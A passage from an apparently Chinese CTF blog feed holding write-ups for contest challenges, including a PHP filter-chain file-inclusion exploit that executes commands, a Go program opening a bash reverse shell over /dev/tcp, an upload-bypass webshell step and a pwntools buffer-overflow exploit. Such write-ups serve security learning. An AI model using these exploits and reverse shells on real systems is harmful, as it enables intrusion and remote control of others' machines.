elf/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/cwd/index.php</a></p><p><img src="/images/Round-8/image-20230216174510836.png" alt="image-20230216174510836"></p><p>ä¸‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://43.142.108.3:28025/index.php?file=&quot;</span></span><br><span class="line">file_to_use = <span class="string">&quot;/etc/passwd&quot;</span></span><br><span class="line">command = <span class="string">&quot;id&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#&lt;?=`$_GET[0]`;;?&gt;</span></span><br><span class="line">base64_payload = <span class="string">&quot;PD89YCRfR0VUWzBdYDs7Pz4&quot;</span></span><br><span class="line"></span><br><span class="line">conversions = &#123;</span><br><span class="line">    <span class="string">&#x27;R&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;B&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;C&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;8&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;9&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;f&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;s&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;z&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;U&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;P&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;V&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;0&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Y&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;W&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;d&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;D&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;7&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;4&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># generate some garbage base64</span></span><br><span class="line">filters = <span class="string">&quot;convert.iconv.UTF8.CSISO2022KR|&quot;</span></span><br><span class="line">filters += <span class="string">&quot;convert.base64-encode|&quot;</span></span><br><span class="line"><span class="comment"># make sure to get rid of any equal signs in both the string we just generated and the rest of the file</span></span><br><span class="line">filters += <span class="string">&quot;convert.iconv.UTF8.UTF7|&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> base64_payload[::-<span class="number">1</span>]:</span><br><span class="line">        filters += conversions[c] + <span class="string">&quot;|&quot;</span></span><br><span class="line">        <span class="comment"># decode and reencode to get rid of everything that isn&#x27;t valid base64</span></span><br><span class="line">        filters += <span class="string">&quot;convert.base64-decode|&quot;</span></span><br><span class="line">        filters += <span class="string">&quot;convert.base64-encode|&quot;</span></span><br><span class="line">        <span class="comment"># get rid of equal signs</span></span><br><span class="line">        filters += <span class="string">&quot;convert.iconv.UTF8.UTF7|&quot;</span></span><br><span class="line"></span><br><span class="line">filters += <span class="string">&quot;convert.base64-decode&quot;</span></span><br><span class="line"></span><br><span class="line">final_payload = <span class="string">f&quot;php://filter/<span class="subst">&#123;filters&#125;</span>/resource=<span class="subst">&#123;file_to_use&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">r = requests.get(url, params=&#123;</span><br><span class="line">    <span class="string">&quot;0&quot;</span>: command,</span><br><span class="line">    <span class="string">&quot;action&quot;</span>: <span class="string">&quot;include&quot;</span>,</span><br><span class="line">    <span class="string">&quot;file&quot;</span>: final_payload</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><h4 id="Upload-gogoggoUpload-gogoggo"><a href="#Upload-gogoggoUpload-gogoggo" class="headerlink" title="Upload_gogoggoUpload_gogoggo"></a>Upload_gogoggoUpload_gogoggo</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;log&quot;</span></span><br><span class="line"><span class="string">&quot;os/exec&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">cmd := exec.Command(<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;bash -i &amp;&gt; /dev/tcp/ip/port 0&gt;&amp;1&quot;</span>)</span><br><span class="line">out, err := cmd.CombinedOutput()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;combined out:\n%s\n&quot;</span>, <span class="keyword">string</span>(out))</span><br><span class="line">log.Fatalf(<span class="string">&quot;cmd.Run() failed with %s\n&quot;</span>, err)</span><br><span class="line">&#125;</span><br><span class="line">fmt.Printf(<span class="string">&quot;combined out:\n%s\n&quot;</span>, <span class="keyword">string</span>(out))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>go run run.go</p><p>ä¸Šä¼ è¿™ä¸ªgoæ–‡ä»¶</p><p>nc -lvnkp</p><p><img src="/images/Round-8/image-20230216184449491.png" alt="image-20230216184449491"></p>]]></content>
      
      
      
        <tags>
            
            <tag> ä¼ªåè®® </tag>
            
            <tag> RCE </tag>
            
            <tag> GO </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023hgameéƒ¨åˆ†wp</title>
      <link href="/2023/01/06/CTFS/2023hgame%E9%83%A8%E5%88%86wp/"/>
      <url>/2023/01/06/CTFS/2023hgame%E9%83%A8%E5%88%86wp/</url>
      
        <content type="html"><![CDATA[<h2 id="week1"><a href="#week1" class="headerlink" title="week1"></a>week1</h2><h3 id="Classic-Childhood-Game"><a href="#Classic-Childhood-Game" class="headerlink" title="Classic Childhood Game"></a>Classic Childhood Game</h3><p>ç®€å•js,æˆ‘ä»¬å³é”®æºä»£ç ä¸€ä¸‹ï¼Œç¿»ä¸€ç¿»jsæ–‡ä»¶ç›´æ¥æœhgame æ²¡æœ‰ï¼Œé‚£è‚¯å®šæ—¶ç¼–ç æˆ–è€…åŠ å¯†äº†ï¼Œæ‰¾æ‰¾å¯ç–‘å­—ç¬¦ä¸²ï¼Œæ‹¿å»è§£ä¸€ä¸‹</p><p><img src="/images/2023hgame%E9%83%A8%E5%88%86wp/image-20230106152018877.png" alt="image-20230106152018877"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">function mota() &#123;</span><br><span class="line">  var a = [&#x27;\x59\x55\x64\x6b\x61\x47\x4a\x58\x56\x6a\x64\x61\x62\x46\x5a\x31\x59\x6d\x35\x73\x53\x31\x6c\x59\x57\x6d\x68\x6a\x4d\x6b\x35\x35\x59\x56\x68\x43\x4d\x45\x70\x72\x57\x6a\x46\x69\x62\x54\x55\x31\x56\x46\x52\x43\x4d\x46\x6c\x56\x59\x7a\x42\x69\x56\x31\x59\x35&#x27;];</span><br></pre></td></tr></table></figure><p><img src="/images/2023hgame%E9%83%A8%E5%88%86wp/image-20230106152036326.png" alt="image-20230106152036326"></p><h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><h4 id="Become-A-Member"><a href="#Become-A-Member" class="headerlink" title="Become A Member"></a>Become A Member</h4><p>å…¸å‹headerå¤´è¯·æ±‚ï¼Œcookieé‚£ä¸ªè¿˜æŒºéš¾æƒ³çš„emmmm</p><p>Referer: bunnybunnybunny.com<br>X-Forwarded-For: 127.0.0.1</p><p>Cookie: code=Vidar</p><p>{â€œusernameâ€:â€luckytodayâ€,â€passwordâ€:â€happy123â€}</p><figure class="highlight plaintext"><figcaption><span>/ HTTP/1.1 http</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Host: week-1.hgame.lwsec.cn:30417</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Cute-Bunny</span><br><span class="line">Referer: bunnybunnybunny.com</span><br><span class="line">X-Forwarded-For: 127.0.0.1</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line">Cookie: code=Vidar</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 47</span><br><span class="line"></span><br><span class="line">&#123;&quot;username&quot;:&quot;luckytoday&quot;,&quot;password&quot;:&quot;happy123&quot;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/images/2023hgame%E9%83%A8%E5%88%86wp/image-20230106172621452.png" alt="image-20230106172621452"></p><h4 id="Guess-Who-I-Am"><a href="#Guess-Who-I-Am" class="headerlink" title="Guess Who I Am"></a>Guess Who I Am</h4><p>è¿™é¢˜æ²¡æœ‰ç”¨hintï¼Œç›´æ¥å…¨é€‰å¤åˆ¶çš„é‚£ä¸ªé¡µé¢ï¼Œç„¶å è„šæœ¬æœ‰ç‚¹éº»çƒ¦</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> ast</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">d = &#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">s = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">ba1van4ba1van4</span></span><br><span class="line"><span class="string">21çº§ / ä¸ä¼šRe / ä¸ä¼šç¾å·¥ / æ´»åœ¨æ¢¦é‡Œ / å–œæ¬¢åšä¸ä¼šçš„äº‹æƒ… / â—¼â—»ç²‰</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">yolandeyolande</span></span><br><span class="line"><span class="string">21çº§ / éå¸¸èœçš„å¯†ç æ‰‹ / å¾ˆæ‡’çš„æ‘¸é±¼çˆ±å¥½è€…ï¼Œæœ‰ç‚¹å‘†ï¼Œæƒ³å­¦ç‚¹åˆ«çš„ä½†æ˜¯ä¸€ç›´å¼€æ‘†</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">t0hkat0hka</span></span><br><span class="line"><span class="string">21çº§ / æ—¥å¸¸è‡ªé—­çš„Reæ‰‹</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">h4kuy4h4kuy4</span></span><br><span class="line"><span class="string">21çº§ / èœé¸¡pwnæ‰‹ / åˆèœåˆçˆ±æ‘†</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">.......</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s1 = s.split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="string">&quot;&quot;</span> <span class="keyword">in</span> s1:<span class="comment"># åˆ¤æ–­æ˜¯å¦æœ‰ç©ºå€¼åœ¨åˆ—è¡¨ä¸­</span></span><br><span class="line">    s1.remove(<span class="string">&quot;&quot;</span>)<span class="comment"># å¦‚æœæœ‰å°±ç›´æ¥é€šè¿‡removeåˆ é™¤</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s1)):</span><br><span class="line">    <span class="keyword">if</span> i%<span class="number">2</span>==<span class="number">0</span>:</span><br><span class="line">        key = s1[i][<span class="number">0</span>:<span class="built_in">int</span>(<span class="built_in">len</span>(s1[i])/<span class="number">2</span>)]</span><br><span class="line">        <span class="comment"># print(key)</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        value = s1[i]</span><br><span class="line">        <span class="comment"># print(value)</span></span><br><span class="line">        d[key]=value</span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"><span class="comment">#é”®å’Œå€¼äº’æ¢</span></span><br><span class="line">d = <span class="built_in">dict</span>(<span class="built_in">zip</span>(d.values(), d.keys()))</span><br><span class="line"><span class="comment">#21:mingzi</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">session = <span class="string">&quot;session=MTY3MzA3MjkwM3xEdi1CQkFFQ180SUFBUkFCRUFBQU9fLUNBQUlHYzNSeWFXNW5EQTBBQzJOb1lXeHNaVzVuWlVsa0EybHVkQVFDQUI0R2MzUnlhVzVuREFnQUJuTnZiSFpsWkFOcGJuUUVBZ0FJfKAl_lYBbx-VHq4BBl3686G2F3ThoYf7RvWQiatnCUqN&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">101</span>):</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    url = <span class="string">&quot;http://week-1.hgame.lwsec.cn:31660/api/getQuestion&quot;</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    headers=&#123;</span><br><span class="line">        <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;application/json, text/plain, */*&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Origin&#x27;</span>: <span class="string">&#x27;http://week-1.hgame.lwsec.cn:31660&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;http://week-1.hgame.lwsec.cn:31660/&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.9,en;q=0.8&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Cookie&#x27;</span>: session,</span><br><span class="line">        <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;close&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    text = requests.get(url,headers=headers)</span><br><span class="line">    ans = <span class="built_in">eval</span>(text.text)</span><br><span class="line">    <span class="comment">#&#123;&#x27;message&#x27;: &#x27;20çº§ / WEB / èœçš„æŠ è„š / æƒ³å­¦GO&#x27;&#125;</span></span><br><span class="line">    answord = <span class="built_in">str</span>(ans[<span class="string">&#x27;message&#x27;</span>])</span><br><span class="line">    <span class="built_in">print</span>(answord)</span><br><span class="line">    <span class="keyword">if</span> answord <span class="keyword">in</span> d.keys():</span><br><span class="line">        <span class="built_in">print</span>(d[answord])</span><br><span class="line">        daan = d[answord]</span><br><span class="line">        data=&#123;</span><br><span class="line">        <span class="string">&#x27;id&#x27;</span>: daan,</span><br><span class="line">    &#125;</span><br><span class="line">        url_verifyAnswer = <span class="string">&quot;http://week-1.hgame.lwsec.cn:31660/api/verifyAnswer&quot;</span></span><br><span class="line">        text_verifyAnswer = requests.post(url = url_verifyAnswer,data=data,headers=headers)</span><br><span class="line">        <span class="comment"># print(text_verifyAnswer.text)</span></span><br><span class="line">        <span class="comment"># print(text_verifyAnswer.headers[&#x27;Set-Cookie&#x27;])</span></span><br><span class="line">        url_Score = <span class="string">&quot;http://week-1.hgame.lwsec.cn:31660/api/getScore&quot;</span></span><br><span class="line">        text_Score = requests.get(url = url_Score,data=data,headers=headers)</span><br><span class="line">        <span class="built_in">print</span>(text_Score.text)</span><br><span class="line">        <span class="comment"># print(text_verifyAnswer.headers[&#x27;Set-Cookie&#x27;])</span></span><br><span class="line">        sesson = re.findall(<span class="string">&quot;(.*?); Path=/&quot;</span>,text_verifyAnswer.headers[<span class="string">&#x27;Set-Cookie&#x27;</span>])</span><br><span class="line">        session = sesson[<span class="number">0</span>]</span><br><span class="line">        <span class="built_in">print</span>(session)</span><br><span class="line">        </span><br></pre></td></tr></table></figure><h4 id="Show-Me-Your-Beauty"><a href="#Show-Me-Your-Beauty" class="headerlink" title="Show Me Your Beauty"></a>Show Me Your Beauty</h4><p>ç®€å•æ–‡ä»¶ä¸Šä¼ ï¼Œé»‘åå•çš„php fuzzä¸€ä¸‹ï¼Œå¤§å°å†™ç»•è¿‡å°±å¯ä»¥äº†ï¼Œä¸Šä¼ shellä¹‹åï¼Œèšå‰‘ï¼Œflagåœ¨è·Ÿä¸‹</p><p><img src="/images/2023hgame%E9%83%A8%E5%88%86wp/image-20230107160532176.png" alt="image-20230107160532176"></p><h3 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h3><h4 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h4><p>ç®€å•rsa n,e,d,éƒ½ç»™äº†ï¼Œä½¿ç”¨å¤§ä½¬çš„å·¥å…·æ‰€å°±è¡Œäº†</p><p><img src="/images/2023hgame%E9%83%A8%E5%88%86wp/image-20230107161606240.png" alt="image-20230107161606240"></p><h3 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h3><h4 id="test-nc"><a href="#test-nc" class="headerlink" title="test_nc"></a>test_nc</h4><p>nc ip port å°±å¯ä»¥æ‰§è¡Œå‘½ä»¤äº†</p><h4 id="easy-overflow"><a href="#easy-overflow" class="headerlink" title="easy_overflow"></a>easy_overflow</h4><p>è¿™ä¸ªç®€å•æº¢å‡ºé¢˜æ²¡è§è¿‡ï¼Œè®°å½•ä¸€ä¸‹<br>ç‚¹å‡»mainå‡½æ•°ï¼Œç„¶åF5æŸ¥çœ‹ä¼ªæºç ,å¯ä»¥çœ‹åˆ°bufå¤„å­˜åœ¨æº¢å‡ºï¼Œä½†æ˜¯æœ‰ä¸ªclose(1)ï¼Œ<br>closeï¼ˆ1ï¼‰å…³é—­äº†æ ‡å‡†è¾“å‡º<br>å‚è€ƒ<code>https://blog.csdn.net/xirenwang/article/details/104139866</code> </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">16</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  close(<span class="number">1</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ ˆ 10+8 backdoor 401176</p><p><img src="/images/2023hgame%E9%83%A8%E5%88%86wp/image-20230207170004991.png" alt="image-20230207170004991"></p><p><img src="/images/2023hgame%E9%83%A8%E5%88%86wp/image-20230207170036399.png" alt="image-20230207170036399"></p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;./vuln&quot;)</span></span><br><span class="line">p= remote(<span class="string">&quot;week-1.hgame.lwsec.cn&quot;</span>,<span class="string">&quot;32588&quot;</span>)</span><br><span class="line">backdoor = <span class="number">0x401176</span></span><br><span class="line">payload= <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x10</span>+<span class="number">8</span>) + p64(backdoor)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.log_level =<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#p.recvuntil(&quot;Welcome!May I have your name?\n&quot;)</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">&#x27;exec 1&gt;&amp;0&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;cat flag&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#or</span></span><br><span class="line"><span class="comment">#p.sendline(&#x27;ls 1&gt;&amp;0&#x27;)</span></span><br><span class="line"><span class="comment">#p.sendline(&#x27;cat flag 1&gt;&amp;0&#x27;)</span></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/images/2023hgame%E9%83%A8%E5%88%86wp/image-20230207170801337.png" alt="image-20230207170801337"></p><h2 id="week2"><a href="#week2" class="headerlink" title="week2"></a>week2</h2><h3 id="web-1"><a href="#web-1" class="headerlink" title="web"></a>web</h3><h4 id="Git-Leakage"><a href="#Git-Leakage" class="headerlink" title="Git Leakage"></a>Git Leakage</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">python GitHack.py url</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">â”Œâ”€â”€(rootğŸ’€bohemian)-[/tools/GitHack/dist]</span><br><span class="line">â””â”€<span class="comment"># cd 